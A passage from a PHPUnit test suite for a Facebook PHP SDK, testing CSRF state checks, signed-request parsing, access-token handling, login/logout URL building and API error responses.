      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $facebook->setCSRFStateToken();
    $code = $_REQUEST['code'] = $this->generateMD5HashOfRandomValue();
    $_REQUEST['state'] = $facebook->getCSRFStateToken();
    $this->assertEquals($code,
                        $facebook->publicGetCode(),
                        'Expect code to be pulled from $_REQUEST[\'code\']');
  }

  public function testGetCodeWithInvalidCSRFState() {
    $facebook = new FBCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $facebook->setCSRFStateToken();
    $code = $_REQUEST['code'] = $this->generateMD5HashOfRandomValue();
    $_REQUEST['state'] = $facebook->getCSRFStateToken().'forgery!!!';
    $this->assertFalse($facebook->publicGetCode(),
                       'Expect getCode to fail, CSRF state should not match.');
  }

  public function testGetCodeWithMissingCSRFState() {
    $facebook = new FBCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $code = $_REQUEST['code'] = $this->generateMD5HashOfRandomValue();
    // intentionally don't set CSRF token at all
    $this->assertFalse($facebook->publicGetCode(),
                       'Expect getCode to fail, CSRF state not sent back.');
  }

  public function testPersistentCSRFState()
  {
    $facebook = new FBCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $facebook->setCSRFStateToken();
    $code = $facebook->getCSRFStateToken();

    $facebook = new FBCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $this->assertEquals($code, $facebook->publicGetState(),
            'Persisted CSRF state token not loaded correctly');
  }

  public function testPersistentCSRFStateWithSharedSession()
  {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $facebook = new FBCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $facebook->setCSRFStateToken();
    $code = $facebook->getCSRFStateToken();

    $facebook = new FBCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));

    $this->assertEquals($code, $facebook->publicGetState(),
            'Persisted CSRF state token not loaded correctly with shared session');
  }

  public function testGetUserFromSignedRequest() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $_REQUEST['signed_request'] = self::kValidSignedRequest();
    $this->assertEquals('499834690', $facebook->getUser(),
                        'Failed to get user ID from a valid signed request.');
  }

  public function testDisallowSignedRequest() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'allowSignedRequest' => false
    ));

    $_REQUEST['signed_request'] = self::kValidSignedRequest();
    $this->assertEquals(0, $facebook->getUser(),
        'Should not have received valid user from signed_request.');
  }


    public function testSignedRequestRewrite(){
    $facebook = new FBRewrite(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $_REQUEST['signed_request'] = self::kValidSignedRequest(self::TEST_USER, 'Hello sweetie');

    $this->assertEquals(self::TEST_USER, $facebook->getUser(),
                        'Failed to get user ID from a valid signed request.');

    $this->assertEquals('Hello sweetie', $facebook->getAccessToken(),
                        'Failed to get access token from signed request');

    $facebook->uncache();

    $_REQUEST['signed_request'] = self::kValidSignedRequest(self::TEST_USER_2, 'spoilers');

    $this->assertEquals(self::TEST_USER_2, $facebook->getUser(),
                        'Failed to get user ID from a valid signed request.');

    $_REQUEST['signed_request'] = null;
    $facebook ->uncacheSignedRequest();

    $this->assertNotEquals('Hello sweetie', $facebook->getAccessToken(),
                        'Failed to clear access token');
  }

  public function testGetSignedRequestFromCookie() {
    $facebook = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $_COOKIE[$facebook->publicGetSignedRequestCookieName()] =
      self::kValidSignedRequest();
    $this->assertNotNull($facebook->publicGetSignedRequest());
    $this->assertEquals('499834690', $facebook->getUser(),
                        'Failed to get user ID from a valid signed request.');
  }

  public function testGetSignedRequestWithIncorrectSignature() {
    $facebook = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $_COOKIE[$facebook->publicGetSignedRequestCookieName()] =
      self::kSignedRequestWithBogusSignature();
    $this->assertNull($facebook->publicGetSignedRequest());
  }

  public function testNonUserAccessToken() {
    $facebook = new FBAccessToken(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    // no cookies, and no request params, so no user or code,
    // so no user access token (even with cookie support)
    $this->assertEquals($facebook->publicGetApplicationAccessToken(),
                        $facebook->getAccessToken(),
                        'Access token should be that for logged out users.');
  }

  public function testMissingMetadataCookie() {
    $fb = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $this->assertEmpty($fb->publicGetMetadataCookie());
  }

  public function testEmptyMetadataCookie() {
    $fb = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $_COOKIE[$fb->publicGetMetadataCookieName()] = '';
    $this->assertEmpty($fb->publicGetMetadataCookie());
  }

  public function testMetadataCookie() {
    $fb = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = 'foo';
    $val = '42';
    $_COOKIE[$fb->publicGetMetadataCookieName()] = "$key=$val";
    $this->assertEquals(array($key => $val), $fb->publicGetMetadataCookie());
  }

  public function testQuotedMetadataCookie() {
    $fb = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = 'foo';
    $val = '42';
    $_COOKIE[$fb->publicGetMetadataCookieName()] = "\"$key=$val\"";
    $this->assertEquals(array($key => $val), $fb->publicGetMetadataCookie());
  }

  public function testAPIForLoggedOutUsers() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $response = $facebook->api(array(
      'method' => 'fql.query',
      'query' => 'SELECT name FROM user WHERE uid=4',
    ));
    $this->assertEquals(count($response), 1,
                        'Expect one row back.');
    $this->assertEquals($response[0]['name'], 'Mark Zuckerberg',
                        'Expect the name back.');
  }

  public function testAPIWithBogusAccessToken() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $facebook->setAccessToken('this-is-not-really-an-access-token');
    // if we don't set an access token and there's no way to
    // get one, then the FQL query below works beautifully, handing
    // over Zuck's public data.  But if you specify a bogus access
    // token as I have right here, then the FQL query should fail.
    // We could return just Zuck's public data, but that wouldn't
    // advertise the issue that the access token is at worst broken
    // and at best expired.
    try {
      $response = $facebook->api(array(
        'method' => 'fql.query',
        'query' => 'SELECT name FROM profile WHERE id=4',
      ));
      $this->fail('Should not get here.');
    } catch(FacebookApiException $e) {
      $result = $e->getResult();
      $this->assertTrue(is_array($result), 'expect a result object');
      $this->assertEquals('190', $result['error_code'], 'expect code');
    }
  }

  public function testAPIGraphPublicData() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $response = $facebook->api('/jerry');
    $this->assertEquals(
      $response['id'], '214707', 'should get expected id.');
  }

  public function testGraphAPIWithBogusAccessToken() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $facebook->setAccessToken('this-is-not-really-an-access-token');
    try {
      $response = $facebook->api('/me');
      $this->fail('Should not get here.');
    } catch(FacebookApiException $e) {
      // means the server got the access token and didn't like it
      $msg = 'OAuthException: Invalid OAuth access token.';
      $this->assertEquals($msg, (string) $e,
                          'Expect the invalid OAuth token message.');
    }
  }

  public function testGraphAPIWithExpiredAccessToken() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $facebook->setAccessToken(self::$kExpiredAccessToken);
    try {
      $response = $facebook->api('/me');
      $this->fail('Should not get here.');
    } catch(FacebookApiException $e) {
      // means the server got the access token and didn't like it
      $error_msg_start = 'OAuthException: Error validating access token:';
      $this->assertTrue(strpos((string) $e, $error_msg_start) === 0,
                        'Expect the token validation error message.');
    }
  }

  public function testGraphAPIOAuthSpecError() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::MIGRATED_APP_ID,
      'secret' => self::MIGRATED_SECRET,
    ));

    try {
      $response = $facebook->api('/me', array(
        'client_id' => self::MIGRATED_APP_ID));

      $this->fail('Should not get here.');
    } catch(FacebookApiException $e) {
      // means the server got the access token
      $msg = 'invalid_request: An active access token must be used '.
             'to query information about the current user.';
      $this->assertEquals($msg, (string) $e,
                          'Expect the invalid session message.');
    }
  }

  public function testGraphAPIMethodOAuthSpecError() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::MIGRATED_APP_ID,
      'secret' => self::MIGRATED_SECRET,
    ));

    try {
      $response = $facebook->api('/daaku.shah', 'DELETE', array(
        'client_id' => self::MIGRATED_APP_ID));
      $this->fail('Should not get here.');
    } catch(FacebookApiException $e) {
      $this->assertEquals(strpos($e, 'invalid_request'), 0);
    }
  }

  public function testCurlFailure() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    if (!defined('CURLOPT_TIMEOUT_MS')) {
      // can't test it if we don't have millisecond timeouts
      return;
    }

    $exception = null;
    try {
      // we dont expect facebook will ever return in 1ms
      Facebook::$CURL_OPTS[CURLOPT_TIMEOUT_MS] = 50;
      $facebook->api('/naitik');
    } catch(FacebookApiException $e) {
      $exception = $e;
    }
    unset(Facebook::$CURL_OPTS[CURLOPT_TIMEOUT_MS]);
    if (!$exception) {
      $this->fail('no exception was thrown on timeout.');
    }

    $code = $exception->getCode();
    if ($code != CURLE_OPERATION_TIMEOUTED && $code != CURLE_COULDNT_CONNECT) {
      $this->fail("Expected curl error code 7 or 28 but got: $code");
    }
    $this->assertEquals('CurlException', $exception->getType(), 'expect type');
  }

  public function testGraphAPIWithOnlyParams() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $response = $facebook->api('/jerry');
    $this->assertTrue(isset($response['id']),
                      'User ID should be public.');
    $this->assertTrue(isset($response['name']),
                      'User\'s name should be public.');
    $this->assertTrue(isset($response['first_name']),
                      'User\'s first name should be public.');
    $this->assertTrue(isset($response['last_name']),
                      'User\'s last name should be public.');
    $this->assertFalse(isset($response['work']),
                       'User\'s work history should only be available with '.
                       'a valid access token.');
    $this->assertFalse(isset($response['education']),
                       'User\'s education history should only be '.
                       'available with a valid access token.');
    $this->assertFalse(isset($response['verified']),
                       'User\'s verification status should only be '.
                       'available with a valid access token.');
  }

  public function testLoginURLDefaults() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] = '/examples';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $encodedUrl = rawurlencode('http://fbrell.com/examples');
    $this->assertNotNull(strpos($facebook->getLoginUrl(), $encodedUrl),
                         'Expect the current url to exist.');
  }

  public function testLoginURLDefaultsDropStateQueryParam() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] = '/examples?state=xx42xx';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $expectEncodedUrl = rawurlencode('http://fbrell.com/examples');
    $this->assertTrue(strpos($facebook->getLoginUrl(), $expectEncodedUrl) > -1,
                      'Expect the current url to exist.');
    $this->assertFalse(strpos($facebook->getLoginUrl(), 'xx42xx'),
                       'Expect the session param to be dropped.');
  }

  public function testLoginURLDefaultsDropCodeQueryParam() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] = '/examples?code=xx42xx';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $expectEncodedUrl = rawurlencode('http://fbrell.com/examples');
    $this->assertTrue(strpos($facebook->getLoginUrl(), $expectEncodedUrl) > -1,
                      'Expect the current url to exist.');
    $this->assertFalse(strpos($facebook->getLoginUrl(), 'xx42xx'),
                       'Expect the session param to be dropped.');
  }

  public function testLoginURLDefaultsDropSignedRequestParamButNotOthers() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] =
      '/examples?signed_request=xx42xx&do_not_drop=xx43xx';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $expectEncodedUrl = rawurlencode('http://fbrell.com/examples');
    $this->assertFalse(strpos($facebook->getLoginUrl(), 'xx42xx'),
                       'Expect the session param to be dropped.');
    $this->assertTrue(strpos($facebook->getLoginUrl(), 'xx43xx') > -1,
                      'Expect the do_not_drop param to exist.');
  }

  public function testLoginURLCustomNext() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] = '/examples';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $next = 'http://fbrell.com/custom';
    $loginUrl = $facebook->getLoginUrl(array(
      'redirect_uri' => $next,
      'cancel_url' => $next
    ));
    $currentEncodedUrl = rawurlencode('http://fbrell.com/examples');
    $expectedEncodedUrl = rawurlencode($next);
    $this->assertNotNull(strpos($loginUrl, $expectedEncodedUrl),
                         'Expect the custom url to exist.');
    $this->assertFalse(strpos($loginUrl, $currentEncodedUrl),
                      'Expect the current url to not exist.');
  }

  public function testLogoutURLDefaults() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] = '/examples';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $encodedUrl = rawurlencode('http://fbrell.com/examples');
    $this->assertNotNull(strpos($facebook->getLogoutUrl(), $encodedUrl),
                         'Expect the current url to exist.');
    $this->assertFalse(strpos($facebook->getLogoutUrl(), self::SECRET));
  }

  public function testNonDefaultPort() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com:8080';
    $_SERVER['REQUEST_URI'] = '/examples';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $encodedUrl = rawurlencode('http://fbrell.com:8080/examples');
    $this->assertNotNull(strpos($facebook->getLoginUrl(), $encodedUrl),
                         'Expect the current url to exist.');
  }

  public function testSecureCurrentUrl() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $_SERVER['REQUEST_URI'] = '/examples';
    $_SERVER['HTTPS'] = 'on';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $encodedUrl = rawurlencode('https://fbrell.com/examples');
    $this->assertNotNull(strpos($facebook->getLoginUrl(), $encodedUrl),
                         'Expect the current url to exist.');
  }

  public function testSecureCurrentUrlWithNonDefaultPort() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com:8080';
    $_SERVER['REQUEST_URI'] = '/examples';
    $_SERVER['HTTPS'] = 'on';
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $encodedUrl = rawurlencode('https://fbrell.com:8080/examples');
    $this->assertNotNull(strpos($facebook->getLoginUrl(), $encodedUrl),
                         'Expect the current url to exist.');
  }

  public function testBase64UrlEncode() {
    $input = 'Facebook rocks';
    $output = 'RmFjZWJvb2sgcm9ja3M';

    $this->assertEquals(FBPublic::publicBase64UrlDecode($output), $input);
  }

  public function testSignedToken() {
    $facebook = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $sr = self::kValidSignedRequest();
    $payload = $facebook->publicParseSignedRequest($sr);
    $this->assertNotNull($payload, 'Expected token to parse');
    $this->assertEquals($facebook->getSignedRequest(), null);
    $_REQUEST['signed_request'] = $sr;
    $this->assertEquals($facebook->getSignedRequest(), $payload);
  }

  public function testNonTossedSignedtoken() {
    $facebook = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $payload = $facebook->publicParseSignedRequest(
      self::kNonTosedSignedRequest());
    $this->assertNotNull($payload, 'Expected token to parse');
    $this->assertNull($facebook->getSignedRequest());
    $_REQUEST['signed_request'] = self::kNonTosedSignedRequest();
    $sr = $facebook->getSignedRequest();
    $this->assertTrue(isset($sr['algorithm']));
  }

  public function testSignedRequestWithEmptyValue() {
    $fb = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $_REQUEST['signed_request'] = self::kSignedRequestWithEmptyValue();
    $this->assertNull($fb->getSignedRequest());
    $_COOKIE[$fb->publicGetSignedRequestCookieName()] =
      self::kSignedRequestWithEmptyValue();
    $this->assertNull($fb->getSignedRequest());
  }

  public function testSignedRequestWithWrongAlgo() {
    $fb = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $payload = $fb->publicParseSignedRequest(
      self::kSignedRequestWithWrongAlgo());
    $this->assertNull($payload, 'Expected nothing back.');
  }

  public function testMakeAndParse() {
    $fb = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $data = array('foo' => 42);
    $sr = $fb->publicMakeSignedRequest($data);
    $decoded = $fb->publicParseSignedRequest($sr);
    $this->assertEquals($data['foo'], $decoded['foo']);
  }

  /**
   * @expectedException InvalidArgumentException
   */
  public function testMakeSignedRequestExpectsArray() {
    $fb = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $sr = $fb->publicMakeSignedRequest('');
  }

  public function testBundledCACert() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));

      // use the bundled cert from the start
    Facebook::$CURL_OPTS[CURLOPT_CAINFO] =
      dirname(__FILE__) . '/../src/fb_ca_chain_bundle.crt';
    $response = $facebook->api('/naitik');

    unset(Facebook::$CURL_OPTS[CURLOPT_CAINFO]);
    $this->assertEquals(
      $response['id'], '5526183', 'should get expected id.');
  }

  public function testVideoUpload() {
    $facebook = new FBRecordURL(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));

    $facebook->api(array('method' => 'video.upload'));
    $this->assertContains('//api-video.', $facebook->getRequestedURL(),
                          'video.upload should go against api-video');
  }

  public function testVideoUploadGraph() {
    $facebook = new FBRecordURL(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));

    $facebook->api('/me/videos', 'POST');
    $this->assertContains('//graph-video.', $facebook->getRequestedURL(),
                          '/me/videos should go against graph-video');
  }

  public function testGetUserAndAccessTokenFromSession() {
    $facebook = new PersistentFBPublic(array(
                                         'appId'  => self::APP_ID,
                                         'secret' => self::SECRET
                                       ));

    $facebook->publicSetPersistentData('access_token',
                                       self::$kExpiredAccessToken);
    $facebook->publicSetPersistentData('user_id', 12345);
    $this->assertEquals(self::$kExpiredAccessToken,
                        $facebook->getAccessToken(),
                        'Get access token from persistent store.');
    $this->assertEquals('12345',
                        $facebook->getUser(),
                        'Get user id from persistent store.');
  }

  public function testGetUserAndAccessTokenFromSignedRequestNotSession() {
    $facebook = new PersistentFBPublic(array(
                                         'appId'  => self::APP_ID,
                                         'secret' => self::SECRET
                                       ));

    $_REQUEST['signed_request'] = self::kValidSignedRequest();
    $facebook->publicSetPersistentData('user_id', 41572);
    $facebook->publicSetPersistentData('access_token',
                                       self::$kExpiredAccessToken);
    $this->assertNotEquals('41572', $facebook->getUser(),
                           'Got user from session instead of signed request.');
    $this->assertEquals('499834690', $facebook->getUser(),
                        'Failed to get correct user ID from signed request.');
    $this->assertNotEquals(
      self::$kExpiredAccessToken,
      $facebook->getAccessToken(),
      'Got access token from session instead of signed request.');
    $this->assertNotEmpty(
      $facebook->getAccessToken(),
      'Failed to extract an access token from the signed request.');
  }

  public function testGetUserWithoutCodeOrSignedRequestOrSession() {
    $facebook = new PersistentFBPublic(array(
                                         'appId'  => self::APP_ID,
                                         'secret' => self::SECRET
                                       ));

    // deliberately leave $_REQUEST and _$SESSION empty
    $this->assertEmpty($_REQUEST,
                       'GET, POST, and COOKIE params exist even though '.
                       'they should.  Test cannot succeed unless all of '.
                       '$_REQUEST is empty.');
    $this->assertEmpty($_SESSION,
                       'Session is carrying state and should not be.');
    $this->assertEmpty($facebook->getUser(),
                       'Got a user id, even without a signed request, '.
                       'access token, or session variable.');
    $this->assertEmpty($_SESSION,
                       'Session superglobal incorrectly populated by getUser.');
  }

  public function testGetAccessTokenUsingCodeInJsSdkCookie() {
    $code = 'code1';
    $access_token = 'at1';
    $methods_to_stub = array('getSignedRequest', 'getAccessTokenFromCode');
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getSignedRequest')
      ->will($this->returnValue(array('code' => $code)));
    $stub
      ->expects($this->once())
      ->method('getAccessTokenFromCode')
      ->will($this->returnValueMap(array(array($code, '', $access_token))));
    $this->assertEquals($stub->getAccessToken(), $access_token);
  }

  public function testSignedRequestWithoutAuthClearsData() {
    $methods_to_stub = array('getSignedRequest', 'clearAllPersistentData');
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getSignedRequest')
      ->will($this->returnValue(array('foo' => 1)));
    $stub
      ->expects($this->once())
      ->method('clearAllPersistentData');
    $this->assertEquals(self::APP_ID.'|'.self::SECRET, $stub->getAccessToken());
  }

  public function testInvalidCodeInSignedRequestWillClearData() {
    $code = 'code1';
    $methods_to_stub = array(
      'getSignedRequest',
      'getAccessTokenFromCode',
      'clearAllPersistentData',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getSignedRequest')
      ->will($this->returnValue(array('code' => $code)));
    $stub
      ->expects($this->once())
      ->method('getAccessTokenFromCode')
      ->will($this->returnValue(null));
    $stub
      ->expects($this->once())
      ->method('clearAllPersistentData');
    $this->assertEquals(self::APP_ID.'|'.self::SECRET, $stub->getAccessToken());
  }

  public function testInvalidCodeWillClearData() {
    $code = 'code1';
    $methods_to_stub = array(
      'getCode',
      'getAccessTokenFromCode',
      'clearAllPersistentData',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getCode')
      ->will($this->returnValue($code));
    $stub
      ->expects($this->once())
      ->method('getAccessTokenFromCode')
      ->will($this->returnValue(null));
    $stub
      ->expects($this->once())
      ->method('clearAllPersistentData');
    $this->assertEquals(self::APP_ID.'|'.self::SECRET, $stub->getAccessToken());
  }

  public function testValidCodeToToken() {
    $code = 'code1';
    $access_token = 'at1';
    $methods_to_stub = array(
      'getSignedRequest',
      'getCode',
      'getAccessTokenFromCode',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getCode')
      ->will($this->returnValue($code));
    $stub
      ->expects($this->once())
      ->method('getAccessTokenFromCode')
      ->will($this->returnValueMap(array(array($code, null, $access_token))));
    $this->assertEquals($stub->getAccessToken(), $access_token);
  }

  public function testSignedRequestWithoutAuthClearsDataInAvailData() {
    $methods_to_stub = array('getSignedRequest', 'clearAllPersistentData');
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getSignedRequest')
      ->will($this->returnValue(array('foo' => 1)));
    $stub
      ->expects($this->once())
      ->method('clearAllPersistentData');
    $this->assertEquals(0, $stub->getUser());
  }

  public function testFailedToGetUserFromAccessTokenClearsData() {
    $methods_to_stub = array(
      'getAccessToken',
      'getUserFromAccessToken',
      'clearAllPersistentData',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getAccessToken')
      ->will($this->returnValue('at1'));
    $stub
      ->expects($this->once())
      ->method('getUserFromAccessToken');
    $stub
      ->expects($this->once())
      ->method('clearAllPersistentData');
    $this->assertEquals(0, $stub->getUser());
  }

  public function testUserFromAccessTokenIsStored() {
    $methods_to_stub = array(
      'getAccessToken',
      'getUserFromAccessToken',
      'setPersistentData',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $user = 42;
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getAccessToken')
      ->will($this->returnValue('at1'));
    $stub
      ->expects($this->once())
      ->method('getUserFromAccessToken')
      ->will($this->returnValue($user));
    $stub
      ->expects($this->once())
      ->method('setPersistentData');
    $this->assertEquals($user, $stub->getUser());
  }

  public function testUserFromAccessTokenPullsID() {
    $methods_to_stub = array(
      'getAccessToken',
      'api',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $user = 42;
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getAccessToken')
      ->will($this->returnValue('at1'));
    $stub
      ->expects($this->once())
      ->method('api')
      ->will($this->returnValue(array('id' => $user)));
    $this->assertEquals($user, $stub->getUser());
  }

  public function testUserFromAccessTokenResetsOnApiException() {
    $methods_to_stub = array(
      'getAccessToken',
      'clearAllPersistentData',
      'api',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('getAccessToken')
      ->will($this->returnValue('at1'));
    $stub
      ->expects($this->once())
      ->method('api')
      ->will($this->throwException(new FacebookApiException(false)));
    $stub
      ->expects($this->once())
      ->method('clearAllPersistentData');
    $this->assertEquals(0, $stub->getUser());
  }

  public function testEmptyCodeReturnsFalse() {
    $fb = new FBPublicGetAccessTokenFromCode(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $this->assertFalse($fb->publicGetAccessTokenFromCode(''));
    $this->assertFalse($fb->publicGetAccessTokenFromCode(null));
    $this->assertFalse($fb->publicGetAccessTokenFromCode(false));
  }

  public function testNullRedirectURIUsesCurrentURL() {
    $methods_to_stub = array(
      '_oauthRequest',
      'getCurrentUrl',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $access_token = 'at1';
    $stub = $this->getMock(
      'FBPublicGetAccessTokenFromCode', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue("access_token=$access_token"));
    $stub
      ->expects($this->once())
      ->method('getCurrentUrl');
    $this->assertEquals(
      $access_token, $stub->publicGetAccessTokenFromCode('c'));
  }

  public function testNullRedirectURIAllowsEmptyStringForCookie() {
    $methods_to_stub = array(
      '_oauthRequest',
      'getCurrentUrl',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $access_token = 'at1';
    $stub = $this->getMock(
      'FBPublicGetAccessTokenFromCode', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue("access_token=$access_token"));
    $stub
      ->expects($this->never())
      ->method('getCurrentUrl');
    $this->assertEquals(
      $access_token, $stub->publicGetAccessTokenFromCode('c', ''));
  }

  public function testAPIExceptionDuringCodeExchangeIsIgnored() {
    $methods_to_stub = array(
      '_oauthRequest',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'FBPublicGetAccessTokenFromCode', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->throwException(new FacebookApiException(false)));
    $this->assertFalse($stub->publicGetAccessTokenFromCode('c', ''));
  }

  public function testEmptyResponseInCodeExchangeIsIgnored() {
    $methods_to_stub = array(
      '_oauthRequest',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'FBPublicGetAccessTokenFromCode', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue(''));
    $this->assertFalse($stub->publicGetAccessTokenFromCode('c', ''));
  }

  public function testExistingStateRestoredInConstructor() {
    $fb = new FBPublicState(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $this->assertEquals(FBPublicState::STATE, $fb->publicGetState());
  }

  public function testMissingAccessTokenInCodeExchangeIsIgnored() {
    $methods_to_stub = array(
      '_oauthRequest',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'FBPublicGetAccessTokenFromCode', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue('foo=1'));
    $this->assertFalse($stub->publicGetAccessTokenFromCode('c', ''));
  }

  public function testAppsecretProofNoParams() {
    $fb = new FBRecordMakeRequest(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $token = $fb->getAccessToken();
